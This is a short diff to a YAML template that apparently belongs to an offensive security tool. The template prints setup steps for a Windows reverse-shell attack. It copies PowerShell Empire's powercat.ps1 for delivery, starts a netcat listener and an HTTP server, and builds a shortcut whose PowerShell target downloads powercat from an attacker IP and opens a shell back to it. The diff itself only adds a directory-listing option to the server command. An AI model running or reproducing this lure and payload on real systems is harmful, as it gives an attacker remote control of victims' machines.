@@ -30,7 +30,7 @@ content: |
   cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 packstation/outbound/;
 
   echo "1. Start a revshell listener: <%echo $(esh scripts/listener-nc)%>"; \
-  echo "2. Start a webserver for powercat:  python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound"; \
+  echo "2. Start a webserver for powercat:  python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound" <%=$(esh variables/delivery_dir_listing)%>; \
   echo "3. Using windows, create a shortcut file with the following target: "; \
   echo 'powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(\'http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/powercat.ps1\');powercat -c <%=$(esh variables/attacker_ip)%> -p <%=$(esh variables/shell_port)%> -e powershell" '; \
   echo "4. Place this shortcut file into packstation/outbound/webdav"; \
